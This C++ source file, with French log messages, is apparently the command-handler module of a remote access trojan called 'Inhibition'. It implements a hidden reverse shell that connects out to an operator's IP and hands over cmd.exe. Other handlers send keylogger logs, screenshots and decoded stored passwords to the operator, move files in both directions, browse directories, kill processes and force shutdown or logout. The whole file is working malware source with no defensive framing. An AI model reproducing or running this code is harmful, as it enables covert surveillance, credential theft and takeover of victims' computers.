#include <winsock2.h>
#include <windows.h>

#include <string>
#include <fstream>
#include <sstream>
using namespace std;

#include "system/ProcessManager.hpp"
#include "system/File.hpp"
using namespace System;

#include <blaspheme/transfer/FileTransfer.hpp>
#include <blaspheme/Blaspheme.hpp>
#include <common/Convert.hpp>
using namespace Blaspheme;
using namespace Network;

#include "RemoteControlFunctions.hpp"
#include "InhibitionCore.hpp"
#include "ServerAbstractFunction.hpp"
#include "ProgramStart.hpp"
#include <malicious/Screenshot.hpp>
#include <malicious/Keylogger.hpp>
#include <malicious/Passwords.hpp>
#include <common/Logger.hpp>
#include <system/System.hpp>
using namespace Malicious;

#define SCREENSHOT_FILENAME "capture.jpg"

namespace Inhibition
{

    void RemoteShell::operator()()
    {
        LOG << "RemoteShell : Started";
		
        SOCKADDR_IN sAddr;
        PROCESS_INFORMATION pi;
        STARTUPINFO si;

        memset( &si, 0, sizeof( si ) );
        si.cb = sizeof( si );
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

		LOG << "Connexion Reverse Shell sur " + cinfo.ip + ":" + to_string(cinfo.port);
        sAddr.sin_addr.s_addr = inet_addr(cinfo.ip.c_str());
        sAddr.sin_port =  htons(cinfo.port);
        sAddr.sin_family = AF_INET;

        SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
		if(c == INVALID_SOCKET)
		{
			LOG << "Impossible d'acquerir un socket pour RemoteShell.";
			return;
		}
        while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
        {
            LOG << "Connexion a echouee.";
            Sleep(100);
        }
		
        si.hStdInput = (HANDLE)c;
        si.hStdOutput = (HANDLE)c;
        si.hStdError = (HANDLE)c;
        if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
        {
			LOG << "Impossible de demarrer cmd.exe pour RemoteShell.";
		}
		else
		{
			LOG << "Attente de la fin du processus.";
			WaitForSingleObject( pi.hProcess, INFINITE );
			CloseHandle( pi.hProcess );
			CloseHandle( pi.hThread );
		}
        closesocket( c );
        LOG << "RemoteShell : Ended";
    }

    void StartDownload::operator()()
    {
        LOG << "StartDownload : Started";
        try
        {
			string path_file;
            session() >> path_file;
            LOG << "Le fichier a envoyer au serveur est : " + path_file;
            Upload transfer(path_file, session().stream());
			transfer.addObserver(new LogTransfer);
            transfer.launch();
		}
        catch(FileNotFound&)
        {
            LOG << "Exception capturee : FICHIER INTROUVABLE.";
        }
        LOG << "StartDownload : Ended";
    }

    void StartUpload::operator()()
    {
        LOG << "StartUpload : Started";
        try
        {
			string path_file;
            session() >> path_file;
            LOG << "Le fichier a recevoir sera telecharge dans : " + path_file;
            Download transfer(path_file, session().stream());
			transfer.addObserver(new LogTransfer);
            transfer.launch();
        }
        catch(FileNotFound&)
        {
            LOG << "Exception capturee : FICHIER INTROUVABLE.";
        }
        LOG << "StartUpload : Ended";
    }

    void BrowseFileTree::operator()()
    {
        LOG << "BrowseFileTree : Started";
        string directory_to_list;
        session() >> directory_to_list;

        // objets qui va lister les différents périphériques et répertoires
        FileListing lister;
        try
        {
            // s'il faut lister le repertoire racine, il faut appeler la fonction
            // de listes de périphériques
            if(directory_to_list == "\\")
            {
                string volumes = lister.get_logical_volumes();
                session() << volumes+FINISHED;
            }
            else
            {
                string directory_list = lister.get_directory_list(directory_to_list);
                if(directory_list.size())
                {
                    session() << directory_list+FINISHED;
                }
                else
                {
                    LOG << "Impossible de lister le repertoire "+directory_to_list;
                    session() << FAILURE;
                }
            }
        }
        catch(ListingError&)
        {
            LOG << "Impossible de lister les disques logiques.";
        }
        catch(FileNotFound&)
        {
            LOG << "Le repertoire a lister n'a pas été trouvé";
        }
        catch(...)
        {
            LOG << "Probleme d'origine inconnue.";
        }
        LOG << "BrowseFileTree : Ended";
    }

    void SendEmail::operator()()
    {
        LOG << "SendEmail : Started";
        LOG << "SendEmail : Finished";
    }

    void UninstallClient::operator()()
    {
        LOG << "Uninstall : Started";
        InhibitionCore::instance().uninstall();
        LOG << "Uninstall : Finished";
    }

    void KillClient::operator()()
    {
        LOG << "KillServer : Started";
        InhibitionCore::instance().exit();
        LOG << "KillServer : Finished";
    }

    void UpgradeClient::operator()()
    {
        LOG << "UpdateServer : Started";
        InhibitionCore::instance().upgrade();
        LOG << "UpdateServer : Finished";
    }

    void RebootClient::operator()()
    {
        LOG << "RebootInhibition : Started";
        SHELLEXECUTEINFO ShExecInfo;
        memset(&ShExecInfo, 0, sizeof(ShExecInfo));
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = NULL;
        ShExecInfo.lpFile = InhibitionCore::instance().getInstallPath().c_str();
        ShExecInfo.lpParameters = NULL;
        ShExecInfo.lpDirectory = NULL;
        ShExecInfo.nShow = SW_SHOW;
        ShExecInfo.hInstApp = NULL;

        if(!ShellExecuteEx(&ShExecInfo))
        {
            LOG << "Impossible de lancer " << InhibitionCore::instance().getInstallPath();
        }
        else
        {
            LOG << "RebootInhibition : Finished";
            InhibitionCore::instance().exit();
        }
        LOG << "RebootInhibition : Ended";
    }

    void SendKeylog::operator()()
    {
        LOG << "SendKeylog : Started";
        try
        {
            Keylogger::instance().flush();

            // si le keylog est vide, on y met un message pour dire a l'utilisateur que rien n'a
            // encore été tapé
            if(!System::Size(Keylogger::instance().get_keylog_path()))
            {
                LOG << "Fichier log vide.";
                session() << KEYLOG_EMPTY;
            }
            else
            {
                session() << SUCCESS;
                Upload upload (Keylogger::instance().get_keylog_path(), session().stream());
                upload.launch();
            }
        }
        catch(...)
        {
            LOG << "SendKeylog : error";
        }
        LOG << "SendKeylog : Finished";
    }

    void SendScreenshot::operator()()
    {
        LOG << "SendScreenshot : Started";
        try
        {
            int quality = 10;
            string buffer_quality;
            LOG << "Attente de la reception de la qualite...";
            session() >> buffer_quality;
            from_string(buffer_quality, quality);
            LOG << "Qualite du screenshot a envoyer : "+buffer_quality;
            LOG << "Copie du screen dans " << SCREENSHOT_FILENAME;
            screenshooter.take(SCREENSHOT_FILENAME, quality);			
			LOG << "Envoi du screenshot";
            Upload upload(SCREENSHOT_FILENAME, session().stream());
			upload.addObserver(new LogTransfer);
            upload.launch();

            LOG << "Fin de l'envoi du screenshot";
            LOG << "Effacement du fichier temporaire";
			remove(SCREENSHOT_FILENAME);
		}
        catch(BadChecksum& )
        {
            LOG << "Le screenshot a mal ete transfere : erreur de checksum";
        }
        catch(...)
        {
            LOG << "Erreur.";
        }
        LOG << "SendScreenshot : Finished";
    }

    void SendPasswords::operator()()
    {
        LOG << "SendPasswords : Started";
        try
        {
			string passes = Malicious::decodeAllPasswords(',');
            if(passes.size())
            {
				LOG << "Envoi des mots de passes : " + passes;
                session() << passes;
            }
            else
            {
                session() << FINISHED;
			}
        }
        catch(Malicious::ErrorWhileRetrieving&)
        {
            session() << "MSN n'est pas installe sur l'ordinateur cible.";
        }
		catch(...)
		{
			session() << "Probleme de recuperation des mots de passe.";
		}
        LOG << "SendPasswords : Finished";
    }

    void SendProcessList::operator()()
    {
        LOG << "SendProcessList : Started";
        session() << System::ProcessManager::GetAllRunningProcess()+FINISHED;
        LOG << "SendProcessList : Ended";
    }

    void KillProcess::operator()()
    {
        LOG << "Inhibition Kill Process : Started";
        string buffer;
        session() >> buffer;

        LOG << "Inhibition va tuer le processus : " + buffer;
        if(System::ProcessManager::KillProcess(buffer))
        {
            session() << SUCCESS;
        }
        else
        {
            LOG << "Impossible de tuer le processus : " + buffer;
            session() << FAILURE;
        }
        LOG << "Inhibition Kill Process : Finished";
    }

    void SendWindowsVersion::operator()()
    {
        LOG << "SendWindowsVersion : Started";
        LOG << "Envoi de la version du systeme : " << System::getSystemVersionString();
        session() << System::getSystemVersionString();
        LOG << "SendWindowsVersion : Finished";
    }

    void SendClientName::operator()()
    {
        LOG << "SendClientName : Started";
        session() << cinfo.name;
        LOG << "SendClientName : Finished";
    }

    void Shutdown::operator()()
    {
        LOG << "Extinction du pc imminent.";
        System::shutdown();
        InhibitionCore::instance().exit();
    }

    void Reboot::operator()()
    {
        LOG << "Reboot du systeme imminent.";
        System::reboot();
        InhibitionCore::instance().exit();
    }

    void Logout::operator()()
    {
        LOG << "Logout de l'utilisateur en cours imminent.";
        System::logout();
        InhibitionCore::instance().exit();
    }

    void Hibernate::operator()()
    {
        LOG << "Mise en veille du pc distant.";
        System::hibernate();
    }

} /* Inhibition */
